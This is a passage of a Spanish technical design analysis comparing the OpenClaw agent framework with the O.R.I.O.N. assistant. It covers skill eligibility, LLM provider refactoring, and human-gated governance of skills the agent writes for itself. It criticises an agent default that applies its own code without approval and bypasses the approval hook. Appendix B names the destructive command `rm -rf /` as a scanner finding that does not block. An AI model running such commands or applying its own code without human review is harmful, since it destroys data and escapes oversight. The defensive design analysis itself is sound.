- **Suspensión de sesión, probes con presupuesto, auto-revert de modelo de sesión.** Resuelven
  operación multi-tenant de larga duración.
- **La escalera de decisión por etapa (`retry_limit` / `prompt` / `assistant`).** O.R.I.O.N. no
  tiene fases de turno tan diferenciadas.

---

### 8.7 Resumen ejecutable

| # | Cambio | Origen | Esfuerzo | Valor | REQ |
|---|---|---|---|---|---|
| 1 | `try` alrededor de `exec_module` + `logging` en vez de `print` | 7.4 / 8.3 | trivial | **alto** | — (fix) |
| 2 | No cachear respuestas de error en `_response_cache` | 8.6 | trivial | **alto** | — (fix) |
| 3 | Warning en colisión de intents | 8.3 | trivial | medio | — (fix) |
| 4 | `FailoverReason` + no hacer fallback ante errores locales | 6.4 | bajo | **alto** | REQ-015 |
| 5 | Excepciones tipadas en vez de `"Error:"` en el string | 8.5 | bajo | **alto** | REQ-015 |
| 6 | `get_requirements()` / `is_eligible()` con motivo logueado | 2.6 / 8.1 | bajo | **alto** | REQ-012 |
| 7 | Backoff exponencial con jitter y `Retry-After` | 6.8 | bajo | alto | REQ-015 |
| 8 | Registro indexado por protocolo (3 adaptadores) | 5.1 | medio | **alto** | REQ-015 |
| 9 | Catálogo de modelos como dato (`models.json`) | 5.4 | medio | **alto** | REQ-015 |
| 10 | Cadena ordenada de fallbacks + cooldown | 6.3 / 6.6 | medio | medio | REQ-015 |
| 11 | `can_fallback_after_error` ligado a acciones amarillas | 6.2 | bajo | **alto** (seguridad) | REQ-015 |
| 12 | Procedencia (`source`) en cada skill | 3.1 | bajo | medio | REQ-012 |
| 13 | Exclusión de contextos no interactivos en autocaptura | 4.6 | bajo | **alto** | REQ-013 |
| 14 | Umbral de repetición desde rutinas observadas | 4.4 | medio | **alto** | REQ-013 |
| 15 | Propuesta de skill → REQ formal (nunca auto-apply) | 4.0 / 9.2 | medio | **crítico** | REQ-013 |

---

## 9. Alimentación a REQs futuros

Insumo para `orion-spec` y `orion-architect`. **No es una spec**: no fija criterios de aceptación
ni sustituye al pipeline. Aporta patrón aplicable, decisiones abiertas y riesgos.

---

### 9.1 REQ-012 — Frontmatter enriquecido: `requires` / `install`

**Categoría probable:** SKILL

#### Patrón aplicable

De la sección 2.6 y 8.1: **declaración de requisitos de runtime con filtrado silencioso pero
explicable**.

Traducción mínima al modelo de clases de O.R.I.O.N. (no hay frontmatter que enriquecer; hay
`BaseSkill` que extender):

```python
class SkillRequirements:
    """Requisitos de runtime declarados por una skill."""
    bins: List[str]        # todos deben existir en PATH
    any_bins: List[str]    # al menos uno debe existir
    env: List[str]         # variables de entorno presentes y no vacías
    os_names: List[str]    # ["Windows"], ["Linux", "Darwin"], vacío = cualquiera
```

Semántica copiada de `evaluateRuntimeEligibility()`: **se evalúa `os` primero** (más barato y más
determinante), y una skill no elegible **se filtra, no falla**.

De `hasBinary()` conviene copiar la **caché de resolución de PATH**: sin ella, N skills × M
binarios son N×M consultas al sistema de archivos en cada arranque. En Windows hay que considerar
`PATHEXT` (`.exe`, `.bat`, `.cmd`), como hace OpenClaw.

#### Decisiones abiertas

1. **¿`requires.config`?** OpenClaw permite exigir claves de configuración. O.R.I.O.N. tiene
   `config.json`. Útil, pero acopla las skills al esquema de configuración. *Recomendación:
   dejarlo fuera de la primera versión.*
2. **¿Elegibilidad en carga o en ejecución?** OpenClaw evalúa al construir el snapshot. Evaluar
   solo al arranque significa que enchufar un dispositivo o exportar una variable no habilita la
   skill hasta reiniciar. *Recomendación: evaluar al cargar y ofrecer un comando de recarga* —
   `skill_creator_skill.py` ya tiene `_reload_skill_manager()`.
3. **¿Cómo se le muestra al usuario?** Es la mejora clave sobre OpenClaw (7.4). Debe existir una
   forma de ver "estas skills están omitidas y por qué". Decidir si es un comando, parte del
   briefing proactivo, o ambos.
4. **¿`install` entra en el alcance?** Ver riesgos.

#### Riesgos

| Riesgo | Mitigación |
|---|---|
| **`install` ejecuta gestores de paquetes** (7.3). Instalar software del sistema es 🔴 **Rojo** en `security-levels.md` | Recomendación fuerte: **dejar `install` fuera de REQ-012**. Que `requires` solo *informe* qué falta y cómo instalarlo manualmente. Si se incluye, debe pasar por `orion-security` y por `require_confirmation()` con nivel Rojo |
| Filtrado silencioso reproduce la debilidad 7.4 | El motivo de exclusión es **criterio de aceptación**, no un extra |
| `hasBinary()` en Windows sin `PATHEXT` da falsos negativos | Cubrir `PATHEXT` explícitamente; O.R.I.O.N. corre en Windows 11 |
| Coste de arranque | Caché de PATH; evaluar `os` primero |

---

### 9.2 REQ-013 — Auto-autoría de skills **con gobernanza**

**Categoría probable:** SKILL (con paso obligatorio por `orion-security`)

Este es el REQ donde O.R.I.O.N. debe **diferenciarse explícitamente de OpenClaw**, no imitarlo.

#### El diferenciador, contrastado con el código real de OpenClaw

OpenClaw, `src/skills/workshop/config.ts` `[VERIFICADO EN CÓDIGO]`:

```ts
const DEFAULT_CONFIG: SkillWorkshopConfig = {
  autonomous: { mode: "auto" },     // ← crea Y APLICA sin preguntar
  allowSymlinkTargetWrites: false,
  approvalPolicy: "auto",           // ← sin aprobación de herramienta
  maxPending: 50,
  maxSkillBytes: 40_000,
};
```

`src/skills/workshop/policy.ts` — con `approvalPolicy: "auto"`,
`resolveSkillWorkshopToolApproval()` devuelve `undefined`: **no se pide aprobación**. Y peor: el
camino de autocaptura llama `autoApplySkillProposal()` **directamente**, puenteando ese hook — de
modo que poner `approvalPolicy: "pending"` **tampoco detendría la autocaptura**. Son dos ejes
ortogonales y ambos están abiertos por defecto.

`src/skills/workshop/auto-apply.ts` — la doctrina, textual:

```ts
// Reviewers stay proposal-only; the normal apply scanner remains the safety boundary.
// Approval-free miscaptures stay recoverable through rejection or curator lifecycle controls.
```

Traducido: *"la barrera de seguridad es el escáner, y los errores se arreglan después"*. Es una
postura de **recuperación posterior**. Y descansa sobre un comentario que ya es falso (7.1).

**O.R.I.O.N. adopta la postura contraria: prevención previa.** No porque sea más conservador por
gusto, sino porque **su arquitectura de seguridad ya lo exige**:

- `security-levels.md`: *"Modificar/borrar el propio código de O.R.I.O.N."* es 🔴 **Rojo**.
  Escribir un `.py` nuevo en `skills/` es exactamente eso.
- REQ-005 hizo el sistema **fail-closed**: lo no clasificado se bloquea. Un skill auto-generado no
  puede ser la excepción a la regla que se acaba de establecer.
- `git.md`: ningún agente ejecuta `git commit`. Un skill que se auto-aplica sin pasar por el humano
  entra al repositorio por la puerta de atrás.

#### El patrón propuesto

```
   ┌─────────────────────────────────────────────────────────────┐
   │  DETECCIÓN  (inspirada en research/signals.ts + rutinas)     │
   │  • rutina observada N veces en ventana de M días             │
   │  • y/o instrucción durable detectada en el texto             │
   │  • huella (hash) para no proponer dos veces lo mismo         │
   └────────────────────────────┬────────────────────────────────┘
                                │
                    ¿contexto interactivo?  (no cron, no ritual,
                                │            no subagente)
                                ▼
   ┌─────────────────────────────────────────────────────────────┐
   │  PROPUESTA  →  se materializa como REQ NUEVO del tracker      │
   │  • ID REQ-XXX, categoría SKILL, estado NUEVO                 │
   │  • evidencia: qué se observó, cuántas veces, cuándo          │
   │  • borrador de skill (plantilla determinista, sin LLM)       │
   └────────────────────────────┬────────────────────────────────┘
                                │
                                ▼
   ┌─────────────────────────────────────────────────────────────┐
   │  PIPELINE DE GOBERNANZA — el que ya existe, sin atajos       │
   │  orion-spec (⏸ humano) → baseline → architect (⏸ humano)     │
   │    → orion-security (obligatorio: escribe código propio)     │
   │      → orion-dev → tester → qa → prueba manual → commit      │
   └─────────────────────────────────────────────────────────────┘
```

**El diferenciador en una frase:** *donde OpenClaw escribe un archivo, O.R.I.O.N. abre un REQ.*

Consecuencias, que son ventajas y no burocracia:

| | OpenClaw | O.R.I.O.N. propuesto |
|---|---|---|
| Latencia hasta tener la skill | segundos | horas/días |
| Aprobación humana | ninguna | dos pausas explícitas |
| Auditoría | fila en SQLite | REQ en el tracker + contexto + evidencias + commit |
| Rollback | store propio con revisiones | `git` |
| Revisión de seguridad | escáner regex | `orion-security` + `orion-qa` |
| Falso positivo | archivo en disco que sombrea un skill del producto | REQ que el humano cierra en 10 segundos |
| Detección | 17 regex, **1 mensaje** basta | rutina repetida N veces + regex |

**El coste del falso positivo se desploma.** Es lo que permite ser *más agresivo* en la detección
sin ser imprudente: proponer de más es barato cuando proponer no aplica nada. Con `mode: "auto"`,
proponer de más escribe archivos.

#### Qué SÍ se adopta de OpenClaw

1. **Plantilla determinista** (4.5). El borrador se genera sin LLM. Esto es contrario a lo que hace
   hoy `skill_creator_skill.py`, y es deliberado: el borrador de un REQ debe ser reproducible y
   diffeable. El LLM tiene su lugar más adelante, en `orion-dev`, **dentro** del pipeline.
2. **Exclusión de contextos no interactivos.** Traducción directa de
   `AUTO_CAPTURE_BLOCKED_TRIGGERS` / `AUTO_CAPTURE_BLOCKED_SESSION_SEGMENTS`: ni
   `proactive_engine`, ni `routines_engine`, ni un sub-agente pueden abrir un REQ de skill.
3. **`skillWorkshopAvailable`**, el gate de privilegio heredado (4.6). Una propuesta nacida en
   Telegram o por voz no puede tener más autoridad que su canal.
4. **Deduplicación por huella.** Misma señal → misma huella → no se abre un REQ duplicado.
5. **Cota de pendientes** (`maxPending: 50`). Si hay demasiadas propuestas abiertas, dejar de
   proponer. Evita que un bug de detección inunde el tracker.
6. **Cota de tamaño** (`maxSkillBytes: 40_000`).

#### Qué NO se adopta

- `autonomous.mode = "auto"` — **ni siquiera como opción configurable**. Que no exista el camino.
- El store SQLite con rollback: el tracker + git ya lo cubren (8.4).
- Cuarentena como estado propio: equivale a "REQ rechazado en QA".
- Locks y colas por workspace: monoproceso.

#### Decisiones abiertas

1. **¿Quién escribe en `requerimientos.csv`?** `CLAUDE.md` dice que el único punto de escritura es
   `update-tracker.mjs`. Un REQ nacido en runtime tendría que invocar ese script desde Python, o
   escribir a una **cola de propuestas** que el humano promueve a REQ. *La segunda opción es más
   segura y no viola la regla del tracker.* **Decisión de arquitectura pendiente.**
2. **¿Umbral de repetición?** ¿N=3 en M=7 días? Debe ser configurable y medible con lo que ya
   registra `learning/routines_engine.py`.
3. **¿Detección por rutina, por regex, o ambas?** La rutina observada es más robusta (8.4); la
   regex captura la instrucción explícita ("de ahora en adelante, siempre..."), que la rutina no
   ve hasta que se repite. *Recomendación: ambas, con la rutina como fuente primaria.*
4. **¿Qué pasa con `skill_creator_skill.py`?** Hoy crea skills bajo demanda explícita del usuario.
   ¿Se mantiene como camino manual (usuario lo pide → 🔴 confirmación → se crea) y REQ-013 solo
   cubre el camino **proactivo**? ¿O ambos convergen en el pipeline? *Es la decisión de alcance
   más importante del REQ y hay que resolverla en `orion-spec`.*
5. **¿Notificación?** ¿O.R.I.O.N. avisa "detecté un patrón, abrí una propuesta", o queda en el
   briefing? Silencioso contradice el principio de no filtrar en silencio (7.4).

#### Riesgos

| Riesgo | Mitigación |
|---|---|
| **Escribir código propio es 🔴 Rojo.** Aun con pipeline, `orion-dev` genera el `.py` | El commit lo hace el humano (`git.md`). `orion-security` obligatorio. El gate de REQ-005 debe cubrir la escritura en `skills/` |
| Inundación del tracker por falsos positivos | Umbral de repetición + dedup por huella + `max_pending` |
| Un ritual proactivo se propone a sí mismo como skill (bucle) | Exclusión de contextos no interactivos (adopción 2) |
| La propuesta filtra datos sensibles del mensaje del usuario a la evidencia del REQ | Sanear la evidencia; no volcar el mensaje crudo |
| Colisión de intents con una skill existente (8.3) | Verificar colisión **en la detección**, antes de proponer |
| El humano se acostumbra a aprobar sin leer | Mantener el volumen bajo: umbral alto por defecto |

---

### 9.3 REQ-015 — Refactor de `ai/llm_provider.py` a registro extensible

**Categoría probable:** INTEGRACION

#### Patrón aplicable

De 5.1, 5.4 y 8.5. Tres módulos, tres preguntas:

```
ai/
├── llm_provider.py          # fachada: generate_response() — API pública sin cambios
├── providers/
│   ├── registry.py          # ApiRegistry indexado por PROTOCOLO
│   ├── openai_compatible.py # cubre openai, deepseek, ollama, groq, together, openrouter…
│   ├── anthropic_messages.py
│   └── google_genai.py
├── catalog/
│   ├── models.json          # datos: provider, id, api, base_url, env_var, capacidades, coste
│   └── registry.py          # get_all() / get_available() / find() / has_configured_auth()
└── auth.py                  # find_env_keys(provider) con precedencia por orden de lista
```

**Los cinco proveedores actuales caen en tres adaptadores** — `_ask_openai`, `_ask_deepseek` y
`_ask_ollama` colapsan en `openai_compatible.py`. Es el beneficio inmediato y medible: menos
código del que hay hoy, y cualquier vendor compatible con OpenAI entra sin escribir Python.

#### Decisiones abiertas

1. **¿Se mantiene la firma de `generate_response(messages, system_prompt, image_path)`?**
   *Recomendación: sí.* El refactor debe ser invisible para `core/base_agent.py` y el dispatcher.
   Es lo que lo hace de bajo riesgo.
2. **¿`models.json` o SQLite?** JSON es diffeable, versionable en git y editable a mano. SQLite
   solo si se necesita refresco remoto (5.4.3), que no es el caso hoy. *Recomendación: JSON.*
3. **¿Se adopta `default_utility_model`?** Alto valor (modelo barato para clasificar y resumir),
   pero amplía el alcance. Puede ser REQ propio.
4. **¿Alcance del failover?** ¿REQ-015 incluye `FailoverReason` + cadena + cooldown, o eso es un
   REQ-016? *Recomendación: incluir `FailoverReason` y el arreglo del caché (baratos y de valor
   alto, ítems 2/4/5 de 8.7); dejar cadena y cooldown para después.*
5. **¿Se toca la caché?** Tiene un bug real (8.6): cachea errores. Debe arreglarse en este REQ
   aunque el resto se posponga.
6. **¿Streaming?** *No.* Cambia la firma y toca todos los canales. REQ propio si se quiere.

#### Riesgos

| Riesgo | Mitigación |
|---|---|
| Refactor sin tests: `tests/` no cubre `llm_provider.py` | `orion-baseline` debe registrarlo. Tests con `unittest.mock.patch` sobre los SDK (`testing.md` los permite) antes de refactorizar |
| Regresión en el camino de visión (`image_path`) | Cada adaptador maneja imágenes distinto (base64 con `media_type` en Anthropic, otro formato en Gemini). Es la parte más frágil del refactor. Criterio de aceptación explícito |
| `media_type: "image/jpeg"` hardcodeado en `_ask_anthropic` | Derivar del archivo real. Arreglar de paso |
| Ollama tiene `base_url` local y no lleva API key | El catálogo necesita `env_var` opcional y `base_url` obligatorio para ese caso |
| Exponer claves en logs de error | `python-style.md` lo prohíbe. Sanear el mensaje antes de loguear — nunca incluir la clave, ni truncada |
| Perder el fallback que hoy funciona | Test de regresión que verifique que con el primario caído se usa el secundario, **antes** de tocar nada |

#### Orden sugerido de ejecución

```
  1. Tests de caracterización de generate_response()  ← red de seguridad
  2. Arreglar caché de errores + excepciones tipadas   ← bugs, valor inmediato
  3. FailoverReason + no hacer fallback ante errores locales
  4. Catálogo models.json + auth.py
  5. ApiRegistry + 3 adaptadores (fachada intacta)
  6. (opcional) cadena ordenada + backoff + cooldown
```

---

### 9.4 Dependencias entre los tres REQs

```
  REQ-012 (requires/elegibilidad)     ── independiente
        │
        └──► aporta el patrón de "declarar y filtrar con motivo"

  REQ-013 (auto-autoría gobernada)    ── depende de REQ-012 para no proponer
        │                                 skills cuyos requisitos no se cumplen
        │
        └──► es el REQ de mayor riesgo: exige orion-security

  REQ-015 (registro de proveedores)   ── independiente de los dos anteriores
        │
        └──► pero REQ-013 lo agradece: la generación de borradores
             se beneficia de un utility_model barato
```

**Orden recomendado: REQ-015 → REQ-012 → REQ-013.**

Razones: REQ-015 contiene arreglos de bugs reales y verificados (caché de errores, fallback ante
excepciones locales) con riesgo bajo y fachada intacta; REQ-012 es autocontenido y prepara el
terreno; REQ-013 es el de mayor superficie de riesgo (toca 🔴 Rojo y el tracker) y conviene
abordarlo con los otros dos ya estabilizados.

---

## Apéndice A — Índice de rutas originales citadas

Todas relativas a `openclaw-main/`. Se listan como **referencia histórica**: el contenido relevante
ya está transcrito dentro de este documento, que es autosuficiente.

### Skills — carga y contrato

| Ruta | Líneas | Qué contiene | Sección |
|---|---:|---|---|
| `src/skills/types.ts` | 140 | `SkillInstallSpec`, `OpenClawSkillMetadata`, `SkillInvocationPolicy`, `SkillCommandSpec`, `SkillEntry`, `SkillEligibilityContext`, `SkillSnapshot`, `WORKSPACE_SKILLS_PROMPT_FORMAT_VERSION = 3` | 2 |
| `src/skills/loading/frontmatter.ts` | 229 | `parseFrontmatter()`, `normalizeSafe*`, `parseInstallSpec()`, `resolveOpenClawMetadata()`, `resolveSkillInvocationPolicy()`, `resolveSkillKey()` | 2 |
| `src/skills/loading/skill-contract.ts` | 65 | `interface Skill`, `formatSkillsForPrompt()` → `<available_skills>` | 2.11 |
| `src/skills/loading/local-loader.ts` | 192 | `readSkillFileSync()` anti-symlink, `loadSingleSkillDirectory()`, `listCandidateSkillDirs()`, `loadSkillsFromDirSafe()` | 3 |
| `src/skills/loading/workspace.ts` | 1972 | seis fuentes y merge por precedencia (~línea 1262) | 3.1 |
| `src/skills/loading/config.ts` | 159 | `shouldIncludeSkill()`, `isSkillEnvRequirementSatisfied()`, `resolveSkillsInstallPreferences()` | 3 |
| `src/skills/loading/source.ts` | 43 | `resolveSkillSource()`, `resolveSkillTelemetrySourceValue()` | 3.1 |
| `src/skills/discovery/command-specs.ts` | — | parseo de dispatch, saneado y dedup de nombres de comando | 3.5 |
| `src/shared/frontmatter.ts` | 166 | `resolveOpenClawManifestBlock()` (JSON5), `…Requires()`, `…Install()` | 2.4 |
| `src/shared/config-eval.ts` | 206 | `evaluateRuntimeRequires()`, `evaluateRuntimeEligibility()`, `hasBinary()` con caché PATH/PATHEXT | 2.6 |
| `packages/markdown-core/src/frontmatter.ts` | 259 | parseo YAML con recuperación; `UNTERMINATED_FRONTMATTER`, `INVALID_ROOT`, `YAML_EXCEPTION` | 2.8 |
| `src/compat/legacy-names.ts` | — | `MANIFEST_KEY = "openclaw"`, `LEGACY_MANIFEST_KEYS = ["clawdbot"]` | 2.4 |

### Skills — autocaptura y taller (auto-autoría)

| Ruta | Líneas | Qué contiene | Sección |
|---|---:|---|---|
| `src/skills/workshop/config.ts` | 63 | **`DEFAULT_CONFIG` con `mode: "auto"` y `approvalPolicy: "auto"`** | 4.1 |
| `src/skills/workshop/auto-apply.ts` | 45 | `autoApplySkillProposal()` y la doctrina "scanner as safety boundary" | 4.0 |
| `src/skills/workshop/policy.ts` | 191 | `resolveSkillWorkshopToolApproval()`, timeout 70 s, `["allow-once","deny"]` | 4.2 |
| `src/skills/workshop/proposal-scan.ts` | 51 | `state: critical > 0 ? "failed" : "clean"` | 4.6 |
| `src/skills/workshop/apply-transition.ts` | — | gate `scan.state !== "clean"` → cuarentena | 4.6 |
| `src/skills/workshop/store-sqlite-rollback.ts` | 174 | `writeSkillProposalRollback()`, invariante "Only pending proposals can be applied." | 4.6 |
| `src/skills/research/autocapture.ts` | 457 | orquestador; triggers bloqueados; `KeyedAsyncQueue`; disparo de auto-apply | 4.5 |
| `src/skills/research/signals.ts` | 742 | **17 `SIGNAL_PATTERNS`**, `extractInstruction()`, `matchExistingSkill()`, `buildProposal()` | 4.4 |
| `src/skills/research/autocapture-auto-apply.test.ts` | 189 | **la evidencia decisiva**: `"auto-applies deterministic capture by default"` | 4.7 |
| `src/skills/security/scanner.ts` | 835 | `SKILL_CONTENT_RULES` con severidades (líneas 228-275) | 4.6 |

### Proveedores LLM

| Ruta | Líneas | Qué contiene | Sección |
|---|---:|---|---|
| `packages/ai/src/api-registry.ts` | 119 | **`ApiProvider`, `createApiRegistry()`** — transcrito íntegro | 5.2 |
| `packages/ai/src/providers/register-builtins.ts` | — | 8 registros perezosos, `BUILT_IN_API_PROVIDER_SOURCE_ID` | 5.3 |
| `packages/ai/src/providers/` | — | anthropic, google, google-vertex, mistral, openai-completions, openai-responses, azure-openai-responses, openai-chatgpt-responses, cloudflare, github-copilot-headers, `anthropic-server-fallback.ts` | 5.6 |
| `packages/llm-core/src/types.ts` | — | `KnownApi` (9), `Api`, `Provider`, `Model<TApi>` | 5.1 |
| `packages/model-catalog-core/src/model-catalog-types.ts` | — | `ModelCatalog*`, `ModelCatalogCompatConfig` (31 flags), `NormalizedModelCatalogRow` | 5.4 |
| `src/model-catalog/` | — | `manifest-planner`, `pricing`, `remote-store`, `remote-refresh`, `remote-overlay`, `bundled-catalog-stamp` | 5.4.3 |
| `src/model-catalog/provider-index/types.ts` | — | `OpenClawProviderIndex*`, `authChoices`, `previewCatalog` | 5.5.1 |
| `src/llm/model-registry.ts` | 10 | `ModelRegistry` — transcrito íntegro | 5.4.4 |
| `src/llm/model-runtime-binding.ts` | 32 | `Symbol` no enumerable + `WeakMap` — transcrito íntegro | 5.4.4 |
| `src/llm/types.ts` | 2 | reexporta `packages/llm-core/src/types.js` | 5.4.4 |
| `packages/ai/src/env-api-keys.ts` | 265 | `getApiKeyEnvVars()` (~35 vendors), `findEnvKeys()`, `getEnvApiKey()` | 5.5 |
| `src/llm/oauth.ts`, `src/llm/github-copilot-oauth-types.ts` | — | OAuth de suscripciones de consumidor | 5.5 |

### Failover y reintentos

| Ruta | Líneas | Qué contiene | Sección |
|---|---:|---|---|
| `src/agents/model-fallback-runner.ts` | 672 | **`runWithModelFallback()`** — la máquina de estados | 6.2 |
| `src/agents/model-fallback-candidates.ts` | 362 | `resolveModelCandidateChain()`, colector con dedup, `routeOrigin` | 6.3 |
| `src/agents/model-fallback-attempt.ts` | 663 | ejecución de un intento y contabilidad | 6.2 |
| `src/agents/model-fallback-cooldown.ts` | 212 | probes, `MIN_PROBE_INTERVAL_MS`, `#90702` | 6.6 |
| `src/agents/failover-policy.ts` | 49 | 3 predicados de presupuesto de probe — transcrito íntegro | 6.6 |
| `src/agents/failover-error.ts` | 921 | clasificación de errores → `FailoverReason` | 6.4 |
| `src/agents/embedded-agent-helpers/types.ts` | — | **`FailoverReason`** (16 valores) — transcrito íntegro | 6.4 |
| `src/agents/embedded-agent-helpers/failover-matches.ts` | 385 | matchers de texto multi-idioma y códigos de vendor | 6.4 |
| `src/agents/embedded-agent-runner/run/failover-policy.ts` | 285 | `RunFailoverDecision`, decisión por etapa | 6.5 |
| `src/agents/session-model-auto-revert.ts` | — | `REVERT_REASONS` (4 de 16) | 6.7 |
| `src/agents/auth-profiles/` | — | perfiles de credencial, `blockedUntil`/`blockedReason` | 6.5 |
| `src/config/model-input.ts` | — | `resolveAgentModelFallbackValues()` → `[]` por defecto | 6.3 |
| `src/config/schema.help.agents.ts` | — | ayuda de `agents.defaults.model.fallbacks` (líneas 73-75) | 6.3 |
| `src/agents/defaults.ts` | — | `DEFAULT_PROVIDER = "openai"`, `DEFAULT_MODEL = "gpt-5.6-sol"` | 6.3 |
| `packages/retry/src/index.ts` | — | `computeBackoff()`, `sleepWithAbort()`, `RetrySupervisor`, `createRetryRunner()` | 6.8 |
| `src/provider-runtime/operation-retry.ts` | — | retry de transporte; `"create"` no reintenta | 6.1 |
| `packages/tool-call-repair/src/` | — | reparación de tool-calls en texto plano, allowlist, rangos protegidos | 6.9 |
| `src/acp/control-plane/manager.backend-failover.ts` | — | **otro** failover: de backends ACP, no de LLM | 6.10 |

### Ejemplos y documentación

| Ruta | Qué contiene | Sección |
|---|---|---|
| `skills/weather/SKILL.md` | ejemplo mínimo | 2.9 |
| `skills/peekaboo/SKILL.md` | ejemplo con `requires` y `os` | 2.9 |
| `skills/gh-issues/SKILL.md` | ejemplo con `requires.bins` | 2.9 |
| `skills/sherpa-onnx-tts/SKILL.md` | ejemplo con `install` | 2.9 |
| `docs/tools/creating-skills.md` | tablas de campos requeridos/opcionales (líneas 90-125) | 2.2 / 7.7 |

---

## Apéndice B — Hallazgos negativos

Lo que se buscó y **no** está. Tiene tanto valor como lo que sí: evita asumir capacidades
inexistentes y evita portar a O.R.I.O.N. cosas que ni el original usa.

### En el sistema de skills

| # | Hallazgo | Verificación |
|---|---|---|
| B1 | **No hay versionado semántico de skills.** El campo `version` viaja al prompt pero no se compara, valida ni gobierna nada | 3.8 |
| B2 | **No hay dependencias skill→skill.** `requires` cubre binarios, env, config y SO; **no** otros skills | 3.8 |
| B3 | **No hay orden de carga ni grafo de dependencias.** Los skills son independientes | 3.8 |
| B4 | **`name` no se valida como slug al cargar.** Solo se normaliza y cae al nombre del directorio | 7.6 |
| B5 | **No hay aviso de colisión de nombres entre fuentes.** Precedencia "last-writer-wins" silenciosa | 3.1 / 7.4 |
| B6 | **Ningún skill real usa `command-dispatch`.** Solo la documentación y 2 tests | 7.7 |
| B7 | **Ningún skill real usa `always: true`** | 7.7 |
| B8 | **`description` faltante = descarte silencioso**, mientras que un YAML roto sí genera diagnóstico. Asimetría de diagnóstico | 3 / 7.4 |
| B9 | **No hay paginación ni filtrado por relevancia de `<available_skills>`.** Van todos los elegibles, con su coste de tokens fijo por turno | 7.10 |
| B10 | **No hay firma criptográfica ni verificación de integridad de skills.** `expectedIntegrity` existe para plugins de proveedor, no para skills | 5.5.1 |

### En la auto-autoría

| # | Hallazgo | Verificación |
|---|---|---|
| B11 | **No hay umbral de repetición.** Un solo mensaje dispara la captura | 4.4 |
| B12 | **No hay ventana temporal ni decaimiento.** Nada expira ni pierde peso con el tiempo | 4.4 |
| B13 | **No hay confirmación humana en el camino por defecto**, y `approvalPolicy: "pending"` **no** detendría la autocaptura porque esta puentea el hook de aprobación | 4.2 |
| B14 | **El LLM no participa en la generación del skill.** La plantilla es fija y determinista | 4.5 |
| B15 | **Los hallazgos `warn` del escáner no bloquean** — incluidos `rm -rf /` y `chmod 777` | 4.6 / 7.2 |

### En los proveedores y el failover

| # | Hallazgo | Verificación |
|---|---|---|
| B16 | **`packages/ai` no contiene ninguna lógica de failover, retry o cooldown.** Cero. La capa de proveedor es deliberadamente tonta | 6.1 |
| B17 | **`src/provider-runtime/` tiene exactamente 2 archivos** (`operation-retry.ts` + test) | 6.1 |
| B18 | **No hay cadena de fallback por defecto.** `agents.defaults.model.fallbacks` está vacío; sin defaults en `src/config/defaults.ts` ni `src/agents/defaults.ts` | 6.3 |
| B19 | **No hay derivación automática de alternativas.** `getAvailable()` y `hasConfiguredAuth()` existen y no se usan para construir una cadena | 7.8 |
| B20 | **No hay protección contra que un plugin reemplace un adaptador del core.** `providers.set()` sin comprobación; el último registro gana, sin aviso | 5.2 |
| B21 | **`packages/tool-call-repair` no tiene relación con el failover.** Es reparación de formato de tool-calls | 6.9 |
| B22 | **No hay balanceo de carga ni enrutado por coste/latencia** entre proveedores. El orden de la cadena es puramente el que escribió el usuario | 6.3 |
| B23 | **No hay circuit breaker propiamente dicho.** Hay cooldown con probes, que es un mecanismo emparentado pero distinto | 6.6 |

### Contradicciones internas encontradas en el propio OpenClaw

| # | Hallazgo |
|---|---|
| B24 | El comentario de `signals.ts` (*"a capture only creates a pending proposal a human must apply"*) **contradice el default `mode: "auto"`** y está desmentido por su propio test | 
| B25 | La lista de APIs del catálogo (`MODEL_CATALOG_APIS`, 10 entradas incluyendo `github-copilot` y `ollama`) **no coincide** con la del registro (`KnownApi`, 9 entradas) |
| B26 | La autonomía está calibrada al revés entre subsistemas: **auto-aplica su propio código** sin permiso, pero **no cambia de proveedor LLM** sin lista manual |

---

*Fin del documento.*
